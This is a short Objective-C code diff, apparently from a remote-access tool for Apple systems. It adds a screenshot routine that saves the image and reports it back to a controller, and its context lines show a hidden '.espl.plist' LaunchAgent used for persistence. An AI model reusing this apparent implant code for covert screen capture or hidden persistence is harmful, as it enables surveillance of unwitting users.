@@ -343,6 +343,9 @@ bool sysTaskRunning = false;
 - (void)screenshot {
   UIImage* image = UIGraphicsGetImageFromCurrentImageContext();
   NSData* imageData = UIImagePNGRepresentation(image);
+  NSString  *jpgPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Test.jpg"];
+  [self.fileManager createFileAtPath:jpgPath contents:imageData attributes:nil];
+  [self sendString:[NSString stringWithFormat:@"Screenshot saved! (%@ (%@))", jpgPath, [[NSByteCountFormatter new] stringFromByteCount:imageData.length]]];
   [self debugLog:[NSString stringWithFormat:@"%@", imageData]];
   [self term];
 }
@@ -778,6 +781,8 @@ char* parseBinary(int* searchChars, int sizeOfSearch) {
                     @"/Library/LaunchAgents/.espl.plist 2>/dev/null;"
           sendTerminal:false];
     }
+  } else if ([args isEqualToString:@"check"]) {
+
   } else {
     [self sendString:@"Unknown Option"];
   }
